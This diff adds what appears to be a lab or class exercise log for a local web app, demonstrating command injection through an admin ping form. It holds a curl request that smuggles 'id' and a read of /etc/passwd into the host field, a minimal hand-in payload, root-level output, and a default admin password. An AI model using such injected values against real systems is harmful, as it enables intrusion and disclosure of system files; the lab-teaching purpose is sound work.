@@ -1,0 +1,27 @@
+== Part 3: command injection through the admin ping box (pre-fix HEAD) ==
+Recorded: 2026-11-17 09:35:24 Europe/Paris
+Session: admin/admin123 (real password, jar kept outside the repo).
+
+$ curl.exe -s -b a.jar --data-urlencode "host=127.0.0.1; id; head -2 /etc/passwd" http://localhost:8081/admin/ping
+<pre> block returned by the app:
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.118 ms
+  
+  --- 127.0.0.1 ping statistics ---
+  1 packets transmitted, 1 received, 0% packet loss, time 0ms
+  rtt min/avg/max/mdev = 0.118/0.118/0.118/0.000 ms
+  uid=0(root) gid=0(root) groups=0(root)
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+-- minimal hand-in payload: host = 127.0.0.1; id --
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.098 ms
+  
+  --- 127.0.0.1 ping statistics ---
+  1 packets transmitted, 1 received, 0% packet loss, time 0ms
+  rtt min/avg/max/mdev = 0.098/0.098/0.098/0.000 ms
+  uid=0(root) gid=0(root) groups=0(root)
+
+-- the web process runs as: --
+  docker exec class9lab-web-1 id -> uid=0(root) gid=0(root) groups=0(root)
